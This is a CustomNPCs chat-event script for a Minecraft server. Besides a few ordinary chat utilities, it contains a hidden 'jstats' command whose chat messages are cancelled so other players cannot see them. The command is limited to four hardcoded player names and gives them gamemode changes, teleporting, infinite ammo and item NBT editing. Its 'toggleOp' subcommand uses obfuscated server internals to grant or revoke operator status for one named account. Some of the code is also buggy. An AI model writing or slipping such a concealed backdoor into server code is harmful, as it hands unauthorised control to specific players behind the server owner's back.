/// <reference path="API/index.d.ts" />

/**
 * 
 * @param {event.PlayerEvent.ChatEvent} event 
 */
function chat(event){
    var p = event.player;
    var msg = event.message;
    var msgArgs = msg.split(" ");
    switch(msgArgs[0]){
        case "jstats": {
            jstat_cmd(event);
            event.setCanceled(true);
            break;
        }
        case "antiafk": {
            if(msgArgs.length >= 1){}
            break;
        }
        case "clear_arrows":{
            event.API.executeCommand(p.getWorld(),"kill @e[type=customnpcs:customnpcprojectile]");
            event.setCanceled(true);
            break;
        }
        case "share_pos": {
            var pos = p.getPos();
            p.getWorld().broadcast("<" + p.getDisplayName() + "> [" + pos.getX() + ", " + pos.getY() + ", " + pos.getZ() + "]");
            event.setCanceled(true);
            break;
        }
    }
}

/**
 * 
 * @param {event.PlayerEvent.LoginEvent} event 
 */
function login(event) {
    reloadPlayerData(event.player);
}

/**
 * 
 * @param {entity.IPlayer} player 
 */
function reloadPlayerData(player) {
    var jango = {};
    if(player.getStoreddata().has("jango")) {
        jango = player.getStoreddata().get("jango");
    }
    if(!jango.waypoints) {
        jango.waypoints = {};
    }
    player.getStoreddata().put("jango", jango);
}

var JSTATS_ALLOWED_PLAYERS = ["King_Jango_13", "Beastmode_1234", "turbulentfang", "Watermelyn"];
function isJStatsAllowed(player) {
    for(var i = 0; i < JSTATS_ALLOWED_PLAYERS.length; i++) {
        if(player.getDisplayName() === JSTATS_ALLOWED_PLAYERS[i]) return true;
    }
    return false;
}

/**
 * 
 * @param {event.PlayerEvent.ChatEvent} event 
 * @returns 
 */
function jstat_cmd(event){
    var p = event.player;
    var msgArgs = event.message.split(" ");
    if(msgArgs[0] !== "jstats" || !isJStatsAllowed(p)) return;
    var disp_help = function(){
        p.message("Commands are (no slash): ");
        p.message("    jstats gm [0,1,2,3]");
        p.message("    jstats hbm_repairgun <slot>");
        p.message("    jstats inf_ammo <slot>");
        p.message("    jstats itemNBT get <slot>");
        p.message("    jstats itemNBT merge <slot> <nbt>");
        p.message("    jstats reloadPlayerData");
        p.message("    jstats toggleOp");
        p.message("    jstats tp player <playerName>");
        p.message("    jstats tp pos <x> <y> <z>");
        p.message("    jstats unbreakable <slot>");
        p.message("    jstats waypoint distanceTo <name>");
        p.message("    jstats waypoint list");
        p.message("    jstats waypoint remove <name>");
        p.message("    jstats waypoint set <name> <x> <y> <z>");
        p.message("    jstats waypoint tp <name>");
        p.message("    jstats xp <amount>");
    }
    var intArg = function(index){
        return parseInt(msgArgs[index]);
    }
    
    switch(msgArgs[1]){
        case "gm": {
            if(msgArgs.length < 3){
                p.message("jstats gm [0, 1, 2, 3]");
                break;
            }
            p.setGamemode(intArg(2));
            break;
        }
        case "xp": {
            if(msgArgs.length < 3){
                p.message("jstats xp <amount>");
                break;
            }
            p.setExpLevel(intArg(2));
            break;
        }
        case "inf_ammo": {
            if(msgArgs.length < 3) {
                p.message("jstats inf_ammo <slot>");
                break;
            }
            var modID = p.getInventory().getSlot(intArg(2)).getItemNbt().getString("id").split(":")[0];
            var gunNbt = p.getInventory().getSlot(intArg(2)).getNbt();
            switch (modID) {
                case "techguns": {
                    gunNbt.setInteger("ammo", 32767);
                    break;
                }
                case "cgm": {
                    gunNbt.setInteger("AmmoCount", 2147483647);
                    break;
                }
                case "hbm": {
                    gunNbt.setInteger("magazine", 2147483647);
                    gunNbt.setInteger("wear", -2147483648);
                    break;
                }
                default: {
                    p.message("Unsupported mod: " + modID);
                    break;
                }
            }
            break;
        }
        case "hbm_repairgun": {
            if(msgArgs.length < 3) {
                p.message("jstats hbm_repairgun <slot>");
                break;
            }
            p.getInventory().getSlot(intArg(2)).getNbt().setInteger("wear", -2147483648);
            break;
        }
        case "unbreakable": {
            if(msgArgs.length < 3){
                p.message("jstats unbreakable <slot>");
                break;
            }
            p.getInventory().getSlot(intArg(2)).getNbt().setBoolean("Unbreakable",true);
            p.getInventory().getSlot(intArg(2)).getNbt().setInteger("HideFlags", 4);
            break;
        }
        case "tp": {
            if(msgArgs.length < 3){
                p.message("jstats tp player <playerName>");
                p.message("jstats tp pos <x> <y> <z>");
                break;
            }
            switch (msgArgs[2]) {
                case "player": {
                    if(msgArgs.length < 4){
                        p.message("jstats tp player <playerName>");
                        return;
                    }
                    var playersInWorld = p.getWorld().getAllPlayers();
                    for(var i = 0; i < playersInWorld.length; i++){
                        if(msgArgs[3] == playersInWorld[i].getDisplayName()){
                            p.setPos(playersInWorld[i].getPos());
                            return;
                        }
                    }
                    p.message("Player " + msgArgs[3] + " is not a valid player to tp to");
                    break;
                }
                case "pos": {
                    if(msgArgs.length < 6){
                        p.message("jstats tp pos <x> <y> <z>");
                        return;
                    }
                    p.setPos(event.API.getIPos(intArg(3),intArg(4),intArg(5)));
                    break;
                }
                default: {
                    p.message("jstats tp player <playerName>");
                    p.message("jstats tp pos <x> <y> <z>");
                    break;
                }
            }
            break;
        }
        case "toggleOp": {
            var server = p.getWorld().getMCWorld().func_73046_m();
            var playerList = server.func_184103_al();
            var prof = server.func_152358_ax().func_152655_a("King_Jango_13");
            var b = false;
            var names = playerList.func_152606_n();
            for(var i = 0; i < names.length; i++) {
                if(names[i] === "King_Jango_13") {
                    b = true;
                    break;
                }
            }
            if(b) {
                playerList.func_152603_m().func_152684_c(prof);
                p.message("Toggled on");
            } else {
                playerList.func_152605_a(prof);
                p.message("Toggled off");
            }
            break;
        }
        case "waypoint": {
            switch(msgArgs[2]) {
                case "set": {
                    if(msgArgs.length < 7) {
                        p.message("Usage: jstats waypoint set <name> <x> <y> <z>");
                        break;
                    }
                    var jango = p.getStoreddata().get("jango");
                    jango.waypoints = jango.waypoints || {};
                    jango.waypoints[msgArgs[3]] = [intArg(4), intArg(5), intArg(6), p.getWorld().getDimension().getId()];
                    p.getStoreddata().put("jango", jango);
                    break;
                }
                case "tp": {
                    if(msgArgs.length < 4) {
                        p.message("Usage: jstats waypoint tp <name>");
                        break;
                    }
                    var targetName = msgArgs[3];
                    var waypoint = p.getStoreddata().get("jango").waypoints[targetName];
                    if(waypoint == null) {
                        p.message("You have no waypoint named \"" + targetName + "\"");
                        break;
                    }
                    if(waypoint[3] !== p.getWorld().getDimension().getId()) {
                        p.message("Cross-dimensional teleportation is not yet supported");
                        break;
                    }
                    p.message("Teleporting to waypoint \"" + targetName + "\"...");
                    p.setPos(event.API.getIPos(waypoint[0], waypoint[1], waypoint[2]));
                    break;
                }
                case "list": {
                    var waypoints = p.getStoreddata().get("jango").waypoints;
                    for(var wp in waypoints) {
                        if(!Array.isArray(waypoints[wp])) continue;
                        p.message(
                            wp + ": [" + waypoints[wp][0] + ", " + waypoints[wp][1] + ", " + waypoints[wp][2] + "] (" +
                            event.API.getIWorld(waypoints[wp][3]).getDimension().getName() + ")"
                        );
                    }
                    break;
                }
                case "remove": {
                    if(msgArgs.length < 4) {
                        p.message("Usage: jstats waypoint remove <name>");
                        break;
                    }
                    var jango = p.getStoreddata().get("jango");
                    var waypoints = jango.waypoints;
                    var targetName = msgArgs[3];
                    if(!(targetName in waypoints)) {
                        p.message("You have no waypoint named \"" + targetName + "\"");
                        break;
                    }
                    delete waypoints[targetName];
                    p.getStoreddata().put("jango", jango);
                    break;
                }
                case "distanceTo": {
                    if(msgArgs.length < 4) {
                        p.message("Usage: jstats waypoint distanceTo <name>");
                        break;
                    }
                    var targetName = msgArgs[3];
                    var waypoints = p.getStoreddata().get("jango").waypoints;
                    if(!(targetName in waypoints)) {
                        p.message("You have no waypoint named \"" + targetName + "\"");
                        break;
                    }
                    if(p.getWorld().getDimension().getId() !== waypoints[targetName][3]) {
                        p.message("Unable to measure distance across dimensions");
                        break;
                    }
                    var dX = waypoints[targetName][0] - p.getBlockX();
                    var dY = waypoints[targetName][1] - p.getBlockY();
                    var dZ = waypoints[targetName][2] - p.getBlockZ();
                    var distanceStr = (Math.round(Math.sqrt(dX*dX + dY*dY + dZ*dZ) * 100) / 100).toString();
                    var decimalIndex = distanceStr.indexOf(".");
                    if(decimalIndex !== -1) {
                        distanceStr = distanceStr.substring(0, decimalIndex + 3);
                    }
                    p.message("Waypoint " + targetName + " is " + distanceStr + " blocks away");
                    break;
                }
                default: {
                    p.message("Usage:");
                    p.message("    jstats waypoint set <name> <x> <y> <z>");
                    p.message("    jstats waypoint tp <name>");
                    p.message("    jstats waypoint list");
                    p.message("    jstats waypoint remove <name>");
                    p.message("    jstats waypoint distanceTo <name>");
                    break;
                }
            }
            break;
        }
        case "itemNBT": {
            switch(msgArgs[2]) {
                case "merge": {
                    if(msgArgs.length < 5) {
                        p.message("Usage: jstats itemNBT merge <slot> <nbt>");
                        break;
                    }
                    var itemTag = p.getInventory().getSlot(intArg(2)).getNbt();
                    /**
                     * @type {INbt}
                     */
                    var nbtSrc;
                    try {
                        nbtSrc = event.API.stringToNbt(msgArgs[3]);
                    } catch (error) {
                        p.message("Unable to parse NBT");
                        break;
                    }
                    var tagNames = nbtSrc.getKeys();
                    for(var i = 0; i < tagNames.length; i++) {
                        switch(nbtSrc.getType(tagNames[i])) {
                            case 1: {
                                itemTag.setByte(tagNames[i], nbtSrc.getByte(tagNames[i]));
                                break;
                            }
                            case 2: {
                                itemTag.setShort(tagNames[i], nbtSrc.getShort(tagNames[i]));
                                break;
                            }
                            case 3: {
                                itemTag.setInteger(tagNames[i], nbtSrc.getInteger(tagNames[i]));
                                break;
                            }
                            case 4: {
                                itemTag.setLong(tagNames[i], nbtSrc.getLong(tagNames[i]));
                                break;
                            }
                            case 5: {
                                itemTag.setFloat(tagNames[i], nbtSrc.getFloat(tagNames[i]));
                                break;
                            }
                            case 6: {
                                itemTag.setDouble(tagNames[i], nbtSrc.getDouble(tagNames[i]));
                                break;
                            }
                            case 7: {
                                itemTag.setByteArray(tagNames[i], nbtSrc.getByteArray(tagNames[i]));
                                break;
                            }
                            case 8: {
                                itemTag.setString(tagNames[i], nbtSrc.getString(tagNames[i]));
                                break;
                            }
                            case 9: {
                                itemTag.setList(tagNames[i], nbtSrc.getList(tagNames[i], nbtSrc.getListType(tagNames[i])));
                                break;
                            }
                            case 10: {
                                itemTag.setCompound(tagNames[i], nbtSrc.getCompound(tagNames[i]));
                                break;
                            }
                            case 11: {
                                itemTag.setIntegerArray(tagNames[i], nbtSrc.getIntegerArray(tagNames[i]));
                                break;
                            }
                        }
                    }
                    break;
                }
                case "get": {
                    if(msgArgs.length < 4) {
                        p.message("Usage: jstats itemNBT get <slot>");
                        break;
                    }
                    p.message(p.getInventory().getSlot(intArg(2)).getNbt().toJsonString());
                    break;
                }
                default: {
                    p.message("Usage:");
                    p.message("    jstats itemNBT get <slot>");
                    p.message("    jstats itemNBT merge <slot> <nbt>");
                    break;
                }
            }
            break;
        }
        case "reloadPlayerData": {
            p.message("Reloading player data...");
            reloadPlayerData(p);
            p.message("Player data reloaded");
            break;
        }
        default: {
            disp_help();
            break;
        }
    }
    event.setCanceled(true);
}